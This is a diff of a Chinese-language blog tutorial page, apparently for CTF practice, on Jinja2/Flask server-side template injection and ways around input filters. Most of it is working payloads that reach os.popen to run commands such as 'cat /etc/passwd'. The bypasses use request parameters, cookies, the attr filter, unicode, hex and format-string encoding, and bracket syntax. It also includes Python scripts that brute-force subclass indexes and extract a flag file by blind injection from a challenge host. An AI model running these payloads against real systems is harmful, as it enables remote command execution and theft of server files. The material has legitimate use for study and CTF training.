href="#attr%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF%E8%BF%87%E6%BB%A4"><span class="toc-text">attr绕过下划线过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8request%E6%96%B9%E6%B3%95"><span class="toc-text">1.使用request方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8unicode%E7%BC%96%E7%A0%81"><span class="toc-text">2、使用unicode编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-text">3、使用十六进制编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E4%BD%BF%E7%94%A8base64%E7%BC%96%E7%A0%81"><span class="toc-text">4、使用base64编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-text">5、格式化字符串</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87%E7%82%B9%E8%BF%87%E6%BB%A4"><span class="toc-text">中括号绕过点过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">绕过关键字过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%9C-%E2%80%9D%E6%8B%BC%E6%8E%A5"><span class="toc-text">“+”拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jinjia2%E4%B8%AD%E7%9A%84%E2%80%9D-%E2%80%9D%E6%8B%BC%E6%8E%A5"><span class="toc-text">jinjia2中的”~”拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8-1"><span class="toc-text">过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8python%E7%9A%84char"><span class="toc-text">利用python的char()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Length%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">Length过滤器绕过数字过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96config%E6%96%87%E4%BB%B6"><span class="toc-text">获取config文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#config"><span class="toc-text">config</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#current-app"><span class="toc-text">current_app</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B7%E5%90%88%E8%BF%87%E6%BB%A4"><span class="toc-text">混合过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dict-%E5%92%8Cjoin"><span class="toc-text">dict()和join</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AC%A6%E5%8F%B7"><span class="toc-text">获取符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%901"><span class="toc-text">实例解析1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%902%EF%BC%88WAF%E8%BF%87%E6%BB%A4%E2%80%99%E2%80%99%E2%80%99%EF%BC%8C%E2%80%99%E2%80%9D%E2%80%98%EF%BC%8C%E2%80%99-%E2%80%99%EF%BC%8C%E2%80%99-%E2%80%99%EF%BC%8C%E2%80%99-%E2%80%98%EF%BC%8C%E2%80%99-%E2%80%99%EF%BC%8C%E2%80%99-%E2%80%98%EF%BC%89"><span class="toc-text">实例解析2（WAF过滤’’’，’”‘，’_’，’.’，’[‘，’]’，’ ‘）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%A8%A1%E7%89%88"><span class="toc-text">其他模版</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Twig"><span class="toc-text">Twig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tornado"><span class="toc-text">tornado</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1015,7 +1304,7 @@
 <h3 id="纯盲注"><a href="#纯盲注" class="headerlink" title="纯盲注"></a>纯盲注</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># coding=utf-8</span><br> <br>import requests<br> <br><span class="hljs-comment">#注意: 这里只适用于 &gt; 的情况</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">start</span> = <span class="hljs-number">1</span>  <span class="hljs-comment"># 第几个字符</span><br><span class="hljs-keyword">while</span> True:<br>    low = <span class="hljs-number">32</span> <br>    high = <span class="hljs-number">126</span><br>    <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2  # 整数除法</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        url = <span class="hljs-string">&quot;http://0b7c2aed-1a0a-4c5c-9829-2e1721548848.challenge.ctf.show/?name=&quot;</span><br>        payload =f<span class="hljs-string">&quot;&#123;&#123;% set a=(lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read(&#123;start&#125;)) %&#125;&#125;&#123;&#123;% if a&gt;&#x27;&#123;flag + chr(mid)&#125;&#x27;%&#125;&#125;lovone&#123;&#123;% endif %&#125;&#125;&quot;</span><br> <br>        url_payload = url + payload<br> <br>        <span class="hljs-comment"># 页面返回正常的特征值</span><br>        identify_str = <span class="hljs-string">&quot;lovone&quot;</span><br> <br>        <span class="hljs-comment"># 请求</span><br>        response = requests.<span class="hljs-built_in">get</span>(url=url_payload)<br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-keyword">if</span> identify_str <span class="hljs-keyword">in</span> response.<span class="hljs-keyword">text</span>:  <span class="hljs-comment"># 页面返回正常</span><br>            low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 页面返回异常</span><br>            high = <span class="hljs-keyword">mid</span><br>        <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2 </span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">mid</span> &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">mid</span> &gt;= <span class="hljs-number">126</span>:<br>            break<br>    <span class="hljs-keyword">if</span> chr(<span class="hljs-keyword">mid</span>) == <span class="hljs-string">&#x27; &#x27;</span>:<br>        break<br>    flag += chr(<span class="hljs-keyword">mid</span>)<br>    print(flag)<br>    <span class="hljs-built_in">start</span> += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
 <hr>
-<h3 id="写入静态文件"><a href="#写入静态文件" class="headerlink" title="写入静态文件"></a>写入静态文件</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">先尝试写入</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;echo &quot;test&quot; &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">然后访问url/static/1.txt显示test</span><br><span class="language-xml">说明成功写入static静态目录</span><br><span class="language-xml"></span><br><span class="language-xml">将flag写入到static静态目录</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;echo cat /app/flag &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">然后访问即可拿到flag</span><br></code></pre></td></tr></table></figure>
+<h3 id="写入静态文件"><a href="#写入静态文件" class="headerlink" title="写入静态文件"></a>写入静态文件</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">先尝试写入</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;echo &quot;test&quot; &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">然后访问url/static/1.txt显示test</span><br><span class="language-xml">说明成功写入static静态目录</span><br><span class="language-xml"></span><br><span class="language-xml">将flag写入到static静态目录</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;echo `cat /app/flag` &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">然后访问url/static/1.txt即可拿到flag</span><br></code></pre></td></tr></table></figure>
 
 <hr>
 <h2 id="getitem绕过中括号过滤"><a href="#getitem绕过中括号过滤" class="headerlink" title="getitem绕过中括号过滤"></a>getitem绕过中括号过滤</h2><p>获取键值或下标</p>
@@ -1033,7 +1322,7 @@
 <hr>
 <h3 id="WAF过滤-例题"><a href="#WAF过滤-例题" class="headerlink" title="WAF过滤[]例题"></a>WAF过滤[]例题</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#先检测双大括号是否被过滤</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;</span>&#125;&#125;</span><span class="language-xml">或</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>&#125;&#125;</span><span class="language-xml">等</span><br><span class="language-xml">#检测是否有过滤符号</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#检测是否有下划线过滤或者特殊字符</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#到此步骤后发现有waf字样</span><br></code></pre></td></tr></table></figure>
 
-<p>使用__getitem()__构造payload：</p>
+<p>使用<code>__getitem()__</code>构造payload：</p>
 <p>python脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;xxx&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>	data = &#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;)&#125;&#125;&#x27;</span>&#125;<br>	<span class="hljs-keyword">try</span>:<br>		response = requests.post(url,data=data)<br>		<span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>			<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;_wrap_close&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>				<span class="hljs-built_in">print</span>(i,<span class="hljs-string">&quot;----&gt;&quot;</span>,respones.text)<br>				<span class="hljs-keyword">break</span><br>	<span class="hljs-keyword">except</span>:<br>		<span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>
 
@@ -1041,7 +1330,165 @@
 <figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>().__getitem__(<span class="hljs-name">117</span>).__init__.__globals__.__getitem__(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">更简便的payload。</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.get</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
 <hr>
-<h2 id="request绕过单双引号过滤"><a href="#request绕过单双引号过滤" class="headerlink" title="request绕过单双引号过滤"></a>request绕过单双引号过滤</h2>
+<h2 id="request绕过单双引号过滤"><a href="#request绕过单双引号过滤" class="headerlink" title="request绕过单双引号过滤"></a>request绕过单双引号过滤</h2><p><strong>查找’os._wrap_close’模块所在位置</strong></p>
+<p>python脚本</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import requests<br>url = <span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>	data = &#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&#x27;&#123;&#123;().__class__.__base__.__subclass__()[&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;]&#125;&#125;&#x27;</span>&#125;<br>	try:<br>		response = requests<span class="hljs-selector-class">.post</span>(url,data=data)<br>		<span class="hljs-keyword">if</span> response<span class="hljs-selector-class">.status_code</span> == <span class="hljs-number">200</span>:<br>			<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;_wrap_close&quot;</span> <span class="hljs-keyword">in</span> response<span class="hljs-selector-class">.text</span>:<br>				<span class="hljs-built_in">print</span>(<span class="hljs-selector-tag">i</span>,<span class="hljs-string">&quot;----&gt;&quot;</span>,response.text)<br>	except:<br>		pass<br></code></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>request</strong></p>
+<p>request在flask中可以访问基于HTTP请求传递的所有信息</p>
+<p>此request并非python的函数，而是在flask内部的函数</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ruby">request.args.key	获取get传入的key的值<br>request.values.x1	所有参数<br>request.cookies		获取cookies传入参数<br>request.headers		获取请求头请求参数<br>request.form.key	获取post传入参数<br>			(<span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span><span class="hljs-symbol">:application/x-www-form-urlencoded</span>或multipart/form-data)<br>request.data		获取post传入参数（<span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span><span class="hljs-symbol">:a/b</span>）<br>request.json		获取post传入json参数（<span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span><span class="hljs-symbol">:application/json</span>）<br></code></pre></td></tr></table></figure>
+
+<p>通过request各种形式的传参</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-11.png"></p>
+<p>可以通过构造带参数的url，配合request获取参数的内容来组成想要提交的指令从而绕过单双引号的使用</p>
+<p>假如我们想实现：</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.___base_</span>&#125;.__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>).read()&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>但单引号被过滤了</p>
+<p>因此<code>[&#39;popen&#39;]</code>和cat命令就实现不了</p>
+<p>我们就能用request来把popen传进去</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.___base__.__subclasses__</span>()[117].__init__.__globals__[request.args.key1](<span class="hljs-name">key2</span>).read()&#125;</span><br><span class="hljs-template-variable"></span><br><span class="hljs-template-variable"><span class="hljs-attr">然后通过get传参?key1</span>=popen&amp;<span class="hljs-attr">key2</span>=cat /etc/passwd，这样就不用使用引号了</span><br><span class="hljs-template-variable"></span><br><span class="hljs-template-variable">也能用post提交</span><br><span class="hljs-template-variable">只要将request.args.key改为request.form.key就行了，然后用hackbar提交</span><br></code></pre></td></tr></table></figure>
+
+<p>通过Cookie提交也可以，换成这种类型即可</p>
+<p>request.cookies.k1</p>
+<p>Cookie传参需要将参数用分号隔开</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Cookie：k1<span class="hljs-operator">=</span>popen<span class="hljs-comment">;k2=cat /etc/passwd</span><br>用hackbar提交<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="过滤器绕过下划线过滤"><a href="#过滤器绕过下划线过滤" class="headerlink" title="过滤器绕过下划线过滤"></a>过滤器绕过下划线过滤</h2><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>1、过滤器通过管道符号（|）与变量连接，并且在括号中可能有可选的参数。</p>
+<h3 id="flask常用过滤器"><a href="#flask常用过滤器" class="headerlink" title="flask常用过滤器"></a><strong>flask常用过滤器</strong></h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss">length	# 获取一个序列或者一个字典的长度并将其返回<br><span class="hljs-built_in">int</span>()	# 将值转换为int类型<br><span class="hljs-attribute">float</span>()	# 将值转换为<span class="hljs-attribute">float</span>类型<br><span class="hljs-built_in">lower</span>()	# 将字符串转换为小写<br><span class="hljs-built_in">upper</span>()	# 将字符串转换为大写<br><span class="hljs-built_in">reverse</span>()	# 反转字符串<br><span class="hljs-built_in">replace</span>(value,old,new)	# 将value中的old替换为new<br><span class="hljs-built_in">list</span>()	# 将变量转换为列表类型<br><span class="hljs-built_in">string</span>()	# 将变量转换成字符串类型<br><span class="hljs-built_in">join</span>()	# 将一个序列中的参数值拼接成字符串，通常有python内置的<span class="hljs-built_in">dict</span>()配合使用<br><span class="hljs-built_in">attr</span>()	# 获取对象的属性<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="attr绕过下划线过滤"><a href="#attr绕过下划线过滤" class="headerlink" title="attr绕过下划线过滤"></a>attr绕过下划线过滤</h3><h4 id="1-使用request方法"><a href="#1-使用request方法" class="headerlink" title="1.使用request方法"></a><strong>1.使用request方法</strong></h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">先选好完整的payload：</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>().__getitem__(<span class="hljs-name">117</span>).__init__.__globals__.__getitem__(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">GET提交：</span><br><span class="language-xml">URL?cla=__class__&amp;bas=__base__&amp;sub=__subclasses__&amp;ini=__init__&amp;glo=__globals__&amp;gei=__getitem__</span><br><span class="language-xml"></span><br><span class="language-xml">POST提交：</span><br><span class="language-xml">code=</span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">request.args.cla</span>)|attr(<span class="hljs-name">request.args.bas</span>)|attr(<span class="hljs-name">request.args.sub</span>)()|attr(<span class="hljs-name">request.args.gei</span>)(<span class="hljs-name">117</span>)|attr(<span class="hljs-name">request.args.ini</span>)|attr(<span class="hljs-name">request.args.glo</span>)|attr(<span class="hljs-name">request.args.gei</span>)(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<p>如果用了attr过滤器就不能用.来连接payload了。</p>
+<p>如果要用下标不能在get传参中写，直接在后面加(数字)</p>
+<hr>
+<h4 id="2、使用unicode编码"><a href="#2、使用unicode编码" class="headerlink" title="2、使用unicode编码"></a>2、使用unicode编码</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&quot;__class__&quot;</span>)|attr(<span class="hljs-name">&quot;__base__&quot;</span>)|attr(<span class="hljs-name">&quot;__subclasses__&quot;</span>)()|attr(<span class="hljs-name">&quot;__getitem__&quot;</span>)(<span class="hljs-name">199</span>)|attr(<span class="hljs-name">&quot;__init__&quot;</span>)|attr(<span class="hljs-name">&quot;__globals__&quot;</span>)|attr(<span class="hljs-name">&quot;__getitem__&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;ls&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">unicode编码</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|attr(<span class="hljs-name">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="hljs-name">199</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;ls&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><span class="language-xml">															</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="3、使用十六进制编码"><a href="#3、使用十六进制编码" class="headerlink" title="3、使用十六进制编码"></a>3、使用十六进制编码</h4><p>把下划线都用\x5f来代替</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">code=&#123;&#123;()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fbase\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]</span>()<span class="hljs-selector-attr">[199]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;os&quot;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-selector-class">.read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="4、使用base64编码"><a href="#4、使用base64编码" class="headerlink" title="4、使用base64编码"></a>4、使用base64编码</h4><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-12.png"></p>
+<h4 id="5、格式化字符串"><a href="#5、格式化字符串" class="headerlink" title="5、格式化字符串"></a>5、格式化字符串</h4><p>%c%(95)即下划线</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-13.png"></p>
+<p>在hackbar内提交需要对%进行编码为%25才能提交</p>
+<p>如果在输入框中可以直接提交</p>
+<hr>
+<h2 id="中括号绕过点过滤"><a href="#中括号绕过点过滤" class="headerlink" title="中括号绕过点过滤"></a>中括号绕过点过滤</h2><p><strong>1、用中括号[]代替点</strong></p>
+<p><strong>python语法除了可以使用点’.’来访问对象属性外，还可以使用中括号’[]’</strong></p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">使用中括号绕过点过滤</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">[&#x27;__class__&#x27;]</span>[&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[117][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;popen&#x27;][&#x27;cat /etc/passwd&#x27;][&#x27;read&#x27;]()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>2、用|attr()绕过</strong></p>
+<p><strong>payload语句中不会用到点’.’和中括号’[]’</strong></p>
